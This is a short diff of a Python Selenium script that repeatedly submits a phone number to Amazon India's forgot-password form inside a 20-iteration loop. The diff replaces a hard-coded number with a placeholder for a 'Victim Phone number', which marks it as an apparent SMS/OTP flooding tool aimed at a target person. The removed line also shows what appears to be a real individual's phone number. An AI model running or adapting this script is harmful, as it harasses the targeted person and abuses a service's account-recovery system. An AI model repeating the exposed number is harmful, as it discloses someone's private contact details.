@@ -4,7 +4,7 @@ browser.get("https://www.amazon.in/ap/forgotpassword?showRememberMe=true&openid.
 
 phoneNumberBox = browser.find_element_by_id("ap_email")
 phoneNumberBox.clear()
-phoneNumberBox.send_keys("+917047810778")
+phoneNumberBox.send_keys("<Victim Phone number here, must be registered with amazon :( >")
 button = browser.find_element_by_id("continue")
 button.click()
 for i in range(20):
